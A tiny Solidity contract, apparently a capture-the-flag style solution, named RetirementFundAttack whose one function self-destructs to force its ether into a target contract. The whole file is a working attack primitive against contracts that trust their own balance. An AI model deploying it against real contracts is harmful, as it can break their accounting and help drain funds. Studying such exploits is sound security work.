// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

contract RetirementFundAttack {
    function destroy(address payable target) external payable {
        selfdestruct(target);
    }
}
